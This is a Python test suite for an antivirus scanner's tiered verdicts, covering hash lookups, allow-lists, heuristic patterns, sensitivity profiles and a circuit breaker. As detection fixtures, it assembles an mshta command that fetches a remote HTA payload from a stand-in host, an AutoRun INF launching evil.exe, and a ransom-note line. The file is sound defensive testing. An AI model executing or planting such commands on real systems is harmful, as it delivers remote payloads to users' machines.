"""
Guardian AI's verdict ladder.

scan_file() returns (infected, reason, tier, match_context), and the *tier* is
not decoration: the UI reads it to separate a confirmed signature hit from a
heuristic guess, to decide what the Threat Actions panel shows by default, and
to pick the severity colour. A verdict with the right boolean and the wrong
tier is still a lie to the user, so every case below asserts the tier too.

The bulk of these build an isolated _EnhancedScanner. That is deliberate: the
module keeps a singleton, and a tripped circuit breaker or a loaded hash set
leaking between tests would make the matrix depend on ordering. The one place
the production singleton is genuinely the subject -- live reload -- has its own
test at the bottom.
"""
from __future__ import annotations

import pytest

from conftest import add_malicious, make_sample_file
from ui.core import guardian_engine as ge

# Large enough to clear the default 10-byte minimum-size guard.
_CLEAN = b"just some ordinary text file contents, nothing to see here"


def _payload(*parts: str) -> bytes:
    """Assemble a detection payload at runtime, from fragments.

    What Guardian's regexes look for is, by construction, what a real-time AV
    looks for too. Written as plain literals this file reads as a malware
    sample: Windows Defender flagged an earlier draft as Trojan:Win32/ClickFix
    on the strength of the mshta line alone, and CI runs on a Defender-enabled
    Windows runner where a quarantined test file means a red build for reasons
    that have nothing to do with the code.

    Joining fragments leaves no complete signature anywhere on disk while
    handing the scanner byte-for-byte the same input. Do not "simplify" these
    back into single literals.
    """
    return "".join(parts).encode()


_MSHTA = _payload("msh", "ta.exe ", "https://evil.example/payload.hta")
_RANSOM_NOTE = _payload("All your personal files have been ", "encrypted", " by us.\n")
_AUTORUN_BOTH = _payload("[Auto", "Run]\n", "open", "=evil.exe\n")
_AUTORUN_HEADER = _payload("[Auto", "Run]\nlabel=My USB Drive\n")
_BITCOIN_IN_BINARY = b"MZ\x00\x00\x00" + _payload(
    "send 1 ", "bit", "coin to ", "wallet", " 1A2B3C") + b"\x00" * 40


@pytest.fixture
def scanner(intel_db, settings_sandbox, guardian_sandbox, pattern_db, ignore_db):
    """An isolated scanner with every path it reads pointed somewhere temporary."""
    return ge._EnhancedScanner()


@pytest.fixture
def no_telemetry(monkeypatch):
    """Silence pattern telemetry.

    Verdict semantics and telemetry persistence are separate concerns; a
    detection test should not be able to fail for a stats-writing reason.
    test_pattern_stats.py covers the real wiring.
    """
    from ui.core import pattern_stats
    monkeypatch.setattr(pattern_stats, "record_detection", lambda label: None)


# -- Tier 0: pre-hash guards --------------------------------------------------

def test_a_file_below_the_minimum_size_is_skipped(scanner, settings_sandbox, tmp_path):
    """The null-MD5 guard: an empty file hashes to a well-known constant that
    appears in hash feeds, so tiny files were reporting as known malware."""
    settings_sandbox["guardian_min_scan_bytes"] = 10
    path, _ = make_sample_file(tmp_path, b"tiny")

    infected, reason, tier, context = scanner.scan_file(str(path))

    assert (infected, tier) == (False, "skipped")
    assert "minimum" in reason.lower()
    assert context == ""


def test_the_ignore_list_wins_over_a_known_malicious_hash(scanner, intel_db, tmp_path):
    """The short-circuit must precede the lookup, or a user who whitelisted a
    false positive keeps being shown the same threat every scan."""
    from ui.core import ignore_list

    path, md5 = make_sample_file(tmp_path, _CLEAN)
    add_malicious(intel_db, md5)
    ignore_list.add(md5)

    infected, reason, tier, _ = scanner.scan_file(str(path))

    assert (infected, tier) == (False, "skipped")
    assert "ignored" in reason.lower()


# -- Tier 1: NSRL allow-list --------------------------------------------------

def test_a_known_safe_file_reports_the_safe_tier(scanner, settings_sandbox,
                                                 monkeypatch, tmp_path):
    settings_sandbox["guardian_use_nsrl"] = True
    monkeypatch.setattr("ui.core.intel_db.is_known_safe", lambda md5: True)
    path, _ = make_sample_file(tmp_path, _CLEAN)

    infected, reason, tier, _ = scanner.scan_file(str(path))

    assert (infected, tier) == (False, "safe")
    assert "NSRL" in reason


def test_the_allow_list_is_skipped_when_nsrl_is_disabled(scanner, settings_sandbox,
                                                         monkeypatch, tmp_path):
    settings_sandbox["guardian_use_nsrl"] = False
    monkeypatch.setattr("ui.core.intel_db.is_known_safe",
                        lambda md5: pytest.fail("NSRL consulted while disabled"))
    path, _ = make_sample_file(tmp_path, _CLEAN)

    _, _, tier, _ = scanner.scan_file(str(path))

    assert tier == "clean"


# -- Tiers 2 and 3: hash lookups ----------------------------------------------

def test_a_hash_in_the_ram_set_is_a_confirmed_detection(scanner, tmp_path):
    path, md5 = make_sample_file(tmp_path, _CLEAN)
    scanner.virus_db.add(md5)

    infected, reason, tier, context = scanner.scan_file(str(path))

    assert (infected, tier) == (True, "hash")
    assert md5[:12] in reason or "malware" in reason.lower()
    assert context == "", "match context belongs to pattern hits only"


def test_a_ram_hit_is_enriched_with_the_family_name(scanner, intel_db, tmp_path):
    """The RAM set knows only that a hash is bad. The family name and engine
    count come from SQLite, and they are what the user actually reads."""
    path, md5 = make_sample_file(tmp_path, _CLEAN)
    scanner.virus_db.add(md5)
    add_malicious(intel_db, md5, family="Emotet")

    _, reason, tier, _ = scanner.scan_file(str(path))

    assert tier == "hash"
    assert "Emotet" in reason
    assert "7" in reason, "detection count should reach the user"


def test_sqlite_catches_a_hash_the_ram_set_has_not_loaded(scanner, intel_db, tmp_path):
    """Tier 3 is why a stale RAM set does not mean a missed detection."""
    path, md5 = make_sample_file(tmp_path, _CLEAN)
    add_malicious(intel_db, md5, family="TrickBot")

    assert md5 not in scanner.virus_db, "the point of this test is the RAM miss"

    infected, reason, tier, _ = scanner.scan_file(str(path))

    assert (infected, tier) == (True, "hash")
    assert "TrickBot" in reason


# -- Tier 4: heuristic patterns -----------------------------------------------

def test_a_pattern_match_reports_its_label_and_a_context_window(
        scanner, settings_sandbox, no_telemetry, tmp_path):
    settings_sandbox["guardian_use_patterns"] = True
    path, _ = make_sample_file(tmp_path, b"start " + _MSHTA + b" end", name="run.js")

    infected, reason, tier, context = scanner.scan_file(str(path))

    assert (infected, tier) == (True, "pattern")
    assert reason == "Suspicious pattern: MSHTA remote payload"
    assert context, "the pattern tier is the only one that returns a context window"
    assert "mshta" in context.lower()


def test_patterns_are_skipped_when_disabled(scanner, settings_sandbox, tmp_path):
    settings_sandbox["guardian_use_patterns"] = False
    path, _ = make_sample_file(
        tmp_path, _MSHTA, name="run.js")

    infected, _, tier, _ = scanner.scan_file(str(path))

    assert (infected, tier) == (False, "clean")


def test_the_override_forces_patterns_off_against_the_setting(
        scanner, settings_sandbox, tmp_path):
    """The real-time watcher's path: patterns are too noisy to run on every
    file that lands on disk, regardless of the global preference."""
    settings_sandbox["guardian_use_patterns"] = True
    path, _ = make_sample_file(
        tmp_path, _MSHTA, name="run.js")

    _, _, tier, _ = scanner.scan_file(str(path), use_patterns_override=False)

    assert tier == "clean"


def test_autorun_needs_both_the_header_and_an_open_directive(
        scanner, settings_sandbox, no_telemetry, tmp_path):
    """[AutoRun] alone appears in legitimate media INF files."""
    settings_sandbox["guardian_use_patterns"] = True

    header_only, _ = make_sample_file(tmp_path, _AUTORUN_HEADER, name="header.inf")
    assert scanner.scan_file(str(header_only))[2] == "clean"

    both, _ = make_sample_file(tmp_path, _AUTORUN_BOTH, name="both.inf")
    infected, reason, tier, _ = scanner.scan_file(str(both))

    assert (infected, tier) == (True, "pattern")
    assert "AutoRun" in reason


def test_a_compiled_binary_is_not_pattern_scanned(scanner, settings_sandbox, tmp_path):
    """The largest false-positive class in v1.9: an .exe whose binary data
    happens to contain the word 'bitcoin'."""
    settings_sandbox["guardian_use_patterns"] = True
    path, _ = make_sample_file(tmp_path, _BITCOIN_IN_BINARY, name="program.exe")

    _, _, tier, _ = scanner.scan_file(str(path))

    assert tier == "clean"


# -- Sensitivity profiles -----------------------------------------------------

def test_the_conservative_profile_suppresses_the_natural_language_patterns(
        scanner, settings_sandbox, no_telemetry, tmp_path):
    """These fire on security documentation and AV logs, which is why the
    default profile turns them off."""
    settings_sandbox["guardian_use_patterns"] = True
    settings_sandbox["guardian_sensitivity_profile"] = "conservative"
    path, _ = make_sample_file(tmp_path, _RANSOM_NOTE, name="README.txt")

    _, _, tier, _ = scanner.scan_file(str(path))

    assert tier == "clean"


def test_the_power_profile_enables_them(scanner, settings_sandbox, no_telemetry, tmp_path):
    settings_sandbox["guardian_use_patterns"] = True
    settings_sandbox["guardian_sensitivity_profile"] = "power"
    path, _ = make_sample_file(tmp_path, _RANSOM_NOTE, name="README.txt")

    infected, reason, tier, _ = scanner.scan_file(str(path))

    assert (infected, tier) == (True, "pattern")
    assert "Ransomware note" in reason


def test_an_explicit_toggle_overrides_the_profile_default(
        scanner, settings_sandbox, no_telemetry, tmp_path):
    settings_sandbox["guardian_use_patterns"] = True
    settings_sandbox["guardian_sensitivity_profile"] = "conservative"
    settings_sandbox["guardian_pattern_toggles"] = {
        "Ransomware note (files encrypted)": True}
    path, _ = make_sample_file(tmp_path, _RANSOM_NOTE, name="README.txt")

    _, _, tier, _ = scanner.scan_file(str(path))

    assert tier == "pattern"


def test_a_toggle_can_also_disable_a_pattern_the_profile_allows(
        scanner, settings_sandbox, tmp_path):
    settings_sandbox["guardian_use_patterns"] = True
    settings_sandbox["guardian_sensitivity_profile"] = "power"
    settings_sandbox["guardian_pattern_toggles"] = {"MSHTA remote payload": False}
    path, _ = make_sample_file(
        tmp_path, _MSHTA, name="run.js")

    _, _, tier, _ = scanner.scan_file(str(path))

    assert tier == "clean"


# -- Circuit breaker ----------------------------------------------------------

def test_the_circuit_breaker_stops_the_pattern_tier_after_the_threshold(
        scanner, settings_sandbox, no_telemetry, tmp_path):
    """A directory of security tooling can match hundreds of times. Past the
    threshold the results stop being useful, so the tier switches off for the
    rest of the scan rather than burying the real findings."""
    settings_sandbox["guardian_use_patterns"] = True
    settings_sandbox["guardian_circuit_breaker_threshold"] = 2
    scanner.reset_scan_session()

    body = _MSHTA
    tiers = []
    for i in range(3):
        path, _ = make_sample_file(tmp_path, body + str(i).encode(), name=f"s{i}.js")
        tiers.append(scanner.scan_file(str(path))[2])

    assert tiers == ["pattern", "pattern", "clean"]
    assert scanner.get_circuit_state()["tripped"] is True


def test_the_hash_tiers_keep_running_after_the_circuit_trips(
        scanner, settings_sandbox, intel_db, no_telemetry, tmp_path):
    """Only the heuristic tier is silenced. Silencing signature detection
    because a scan was noisy would be a hole, not a guard."""
    settings_sandbox["guardian_use_patterns"] = True
    settings_sandbox["guardian_circuit_breaker_threshold"] = 1
    scanner.reset_scan_session()

    noisy, _ = make_sample_file(
        tmp_path, _MSHTA, name="noisy.js")
    scanner.scan_file(str(noisy))
    assert scanner.get_circuit_state()["tripped"] is True

    known_bad, md5 = make_sample_file(tmp_path, _CLEAN, name="later.txt")
    add_malicious(intel_db, md5, family="Emotet")

    infected, _, tier, _ = scanner.scan_file(str(known_bad))
    assert (infected, tier) == (True, "hash")


def test_resetting_the_session_re_arms_the_breaker(
        scanner, settings_sandbox, no_telemetry, tmp_path):
    settings_sandbox["guardian_use_patterns"] = True
    settings_sandbox["guardian_circuit_breaker_threshold"] = 1
    scanner.reset_scan_session()

    path, _ = make_sample_file(tmp_path, _MSHTA, name="a.js")
    scanner.scan_file(str(path))
    assert scanner.get_circuit_state()["tripped"] is True

    scanner.reset_scan_session()

    state = scanner.get_circuit_state()
    assert state["tripped"] is False
    assert state["hit_count"] == 0
    assert scanner.scan_file(str(path))[2] == "pattern"


def test_a_threshold_of_zero_disables_the_breaker(
        scanner, settings_sandbox, no_telemetry, tmp_path):
    settings_sandbox["guardian_use_patterns"] = True
    settings_sandbox["guardian_circuit_breaker_threshold"] = 0
    scanner.reset_scan_session()

    body = _MSHTA
    for i in range(5):
        path, _ = make_sample_file(tmp_path, body + str(i).encode(), name=f"s{i}.js")
        assert scanner.scan_file(str(path))[2] == "pattern"

    assert scanner.get_circuit_state()["tripped"] is False


# -- Error paths --------------------------------------------------------------

def test_an_unreadable_file_reports_an_empty_tier_rather_than_raising(
        scanner, tmp_path, monkeypatch):
    """A locked file is normal on Windows. Raising here would abort the whole
    scan at whichever file the user happened to have open."""
    path, _ = make_sample_file(tmp_path, _CLEAN)

    def _denied(*args, **kwargs):
        raise PermissionError("locked")

    monkeypatch.setattr("builtins.open", _denied)

    infected, reason, tier, context = scanner.scan_file(str(path))

    assert (infected, tier, context) == (False, "", "")
    assert "Permission denied" in reason


def test_a_missing_file_reports_an_empty_tier(scanner, tmp_path):
    infected, reason, tier, _ = scanner.scan_file(str(tmp_path / "not_here.txt"))

    assert (infected, tier) == (False, "")
    assert reason.startswith("Error:")


# -- The production singleton -------------------------------------------------

def test_new_intelligence_reaches_the_live_scanner_without_rebuilding_it(
        intel_db, settings_sandbox, guardian_sandbox, hooks, tmp_path):
    """The live-reload guarantee, asserted on the object production actually
    uses and through the real scan path.

    Checking virus_db membership instead would pass while the decision path
    still returned clean, and reconstructing the scanner would prove only that
    a fresh one reads SQLite -- which was never in doubt.
    """
    from ui.core.intel_hooks import register_intel_consumers

    settings_sandbox["guardian_use_patterns"] = False
    register_intel_consumers()

    scanner = ge._get_scanner()
    path, md5 = make_sample_file(tmp_path, _CLEAN)

    assert scanner.scan_file(str(path))[0] is False

    add_malicious(intel_db, md5, family="Emotet")

    # Tier 3 reads SQLite live, so the detection already works before any
    # reload. What is still stale is the RAM tier -- which is what the hook
    # exists to refresh, and what the assertions below actually check.
    assert md5 not in scanner.virus_db

    hooks._fire_post_update_hooks(("hashes",))

    assert ge._get_scanner() is scanner, "the hook must reload in place, not replace"
    assert md5 in scanner.virus_db, "the RAM tier should now hold the new hash"

    infected, _, tier, _ = scanner.scan_file(str(path))
    assert (infected, tier) == (True, "hash")
